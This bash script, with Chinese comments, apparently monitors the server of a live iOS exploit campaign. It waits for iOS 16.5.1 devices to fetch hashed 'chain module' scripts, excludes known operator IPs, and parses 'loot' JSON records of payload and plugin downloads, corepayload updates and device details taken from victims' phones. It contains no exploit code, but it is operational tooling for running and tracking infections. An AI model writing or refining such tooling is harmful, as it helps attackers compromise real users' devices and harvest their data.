#!/bin/bash
# 盯新设备（16.5.1 云真机 / 16.1 重投）：只读 watcher 启动后新增的日志字节
LOG=/www/wwwlogs/i.131422.com.log
NLOG=/www/wwwlogs/i.131422.com.node.log
L=/www/wwwroot/i.131422.com/loot
SEEN=/tmp/hg_w3_seen.txt
HIT=/tmp/hg_w3_hit
: > "$SEEN"; rm -f "$HIT"
END=$(( $(date +%s) + 2400 ))
OFF=$(stat -c%s "$LOG")
NOFF=$(stat -c%s "$NLOG")
KNOWN="127.0.0.1|202.146.222.253|182.239.92.215|112.47.135.113|117.188.116.13|117.188.116.14|222.92.47.194|112.91.192.4|58.240.238.70|103.234.68.110|103.234.68.69|103.234.68.80|117.188.112.160|117.188.29.119|117.188.113.29|185.255.127.35|185.255.127.18|185.255.127.193|194.231.141.101|194.231.141.103|193.186.253.193|209.10.139.184|31.6.63.108|31.6.63.109|31.6.63.120|31.6.63.195"
echo "[$(date -u +%T)] watcher3 start  offset=$OFF  cap=40min"

while [ "$(date +%s)" -lt "$END" ]; do
  NOW=$(stat -c%s "$LOG"); NNOW=$(stat -c%s "$NLOG")
  if [ "$NOW" -gt "$OFF" ]; then
    tail -c +$((OFF+1)) "$LOG" > /tmp/hg_w3_new.log
    OFF=$NOW
    # A. 链模块请求（新 IP）
    grep -aE '49554fde7424c31c\.js|226cbd84|81b403cc|7a1cef00016b950|377bed74|4817ea80' /tmp/hg_w3_new.log \
      | grep -avE "^($KNOWN) " | awk '{print $1,$4,$7,$9,$10}' | sed 's/\[//' >> /tmp/hg_w3_chain.txt
    # B. 16.5.1 UA
    grep -a "16_5_1 like" /tmp/hg_w3_new.log | awk '{print $1,$4,$7,$9,$10}' | sed 's/\[//' >> /tmp/hg_w3_ua.txt
    # C. details/show.html 或 daily.html（重投信号）
    grep -a "details/show.html\|sync/daily.html" /tmp/hg_w3_new.log | grep -avE "^($KNOWN) " \
      | awk '{print $1,$4,$7,$9,$10}' | sed 's/\[//' >> /tmp/hg_w3_det.txt
  fi
  if [ "$NNOW" -gt "$NOFF" ]; then
    tail -c +$((NOFF+1)) "$NLOG" | grep -a "CorunaLoot:ip-sync" | cut -c1-260 >> /tmp/hg_w3_ips.txt
    NOFF=$NNOW
  fi
  # D. 新 plugin_* 事件
  SINCE="$(date -u -d '-90 seconds' '+%Y-%m-%d %H:%M:%S')"
  find "$L" -name '*.json' ! -name '*.meta.json' -newermt "$SINCE" 2>/dev/null > /tmp/hg_w3_loot.txt
  while IFS= read -r f; do
    grep -q 'plugin_batch_done\|plugin_download_ok\|plugin_download_failed\|plugin_verify_failed\|config_download_failed\|corepayload_update' "$f" 2>/dev/null || continue
    grep -qF "$f" "$SEEN" 2>/dev/null && continue
    echo "$f" >> "$SEEN"
    python3 - "$f" <<'PY'
import json, sys, datetime
try: d = json.load(open(sys.argv[1]))
except Exception: sys.exit()
print('[%s] LOOT %-24s dev=%-12s os=%-7s total=%s entries=%s ok=%s sb=%s bundle=%-24s reason=%s' % (
    datetime.datetime.utcnow().strftime('%H:%M:%S'), d.get('et'), str(d.get('device')), str(d.get('pv')),
    str(d.get('total')), str(d.get('entries')), str(d.get('ok')), str(d.get('springboard')),
    str(d.get('bundleId'))[:24], d.get('reason')))
PY
    echo hit >> "$HIT"
  done < /tmp/hg_w3_loot.txt

  # 判定：真信号才退
  if [ -s /tmp/hg_w3_ua.txt ]; then echo "[$(date -u +%T)] 命中 16_5_1 UA"; echo hit >> "$HIT"; fi
  if [ -s /tmp/hg_w3_chain.txt ]; then echo "[$(date -u +%T)] 命中新 IP 链模块"; echo hit >> "$HIT"; fi
  if [ -s /tmp/hg_w3_det.txt ]; then echo "[$(date -u +%T)] 命中新 IP 拉 show/daily"; echo hit >> "$HIT"; fi
  [ -s "$HIT" ] && { echo "[$(date -u +%T)] 命中，退出"; break; }
  sleep 20
done

echo "=== watcher3 结束 $(date -u +%T) ==="
echo "--- 新 IP 链模块 ---"; tail -20 /tmp/hg_w3_chain.txt 2>/dev/null
echo "--- 16_5_1 UA ---"; tail -10 /tmp/hg_w3_ua.txt 2>/dev/null
echo "--- 新 IP 拉 show/daily ---"; tail -20 /tmp/hg_w3_det.txt 2>/dev/null
echo "--- 期间 ip-sync ---"; tail -10 /tmp/hg_w3_ips.txt 2>/dev/null
echo "--- plugin_* 事件 ($(wc -l < "$SEEN" 2>/dev/null) 条) ---"; while IFS= read -r f; do basename "$f"; done < "$SEEN"
